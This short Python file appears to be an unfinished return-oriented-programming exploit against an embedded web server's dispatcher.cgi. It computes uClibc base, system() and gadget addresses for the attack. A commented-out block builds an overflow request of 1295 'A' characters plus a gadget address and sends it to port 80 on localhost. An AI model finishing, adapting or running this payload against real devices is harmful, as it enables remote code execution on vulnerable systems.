from __future__ import print_function

import socket

"""
Get this to work for main() and then make it more dynamic later
Just get it working for now
"""

class ROPAttack:
def __init__(self, libcBase, systemOffset, gadgetOffset):
# libuClibc-0.9.29.so contains all the c library code stuff, to include system()
self.libcBase = libcBase
self.systemBase = self.libcBase + systemOffset
self.gadgetBase = self.libcBase + gadgetOffset

def render(self):
print("libc base: {:x}".format(self.libcBase))
print("system base: {:x}".format(self.systemBase))
print("gadget base: {:x}".format(self.gadgetBase))

"""
system = "\xE0\x27\xF2\x2A"
gadget = "\xA0\xB7\xEF\x2A"

BUF = "A" * 1295 + gadget
PACKET = "GET /dispatcher.cgi?template=common.js.pdf.gz" + BUF
PACKET += " HTTP/1.1\r\n"
PACKET += "Host: 127.0.0.1:80\r\n"
PACKET += "User-Agent: Mozilla\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 80))
data = s.send(PACKET)
print("Sent:\n{}".format(repr(data)))
print("Try connecting with debugger")

#response = s.recv(4096)  
#http_response = repr(response)
#http_response_len = len(http_response)
#print("Got:\n{}".format(http_response))

s.close()
"""

attack = ROPAttack(0x2aed6000, 0x4c7e0, 0x257a0)
attack.render()
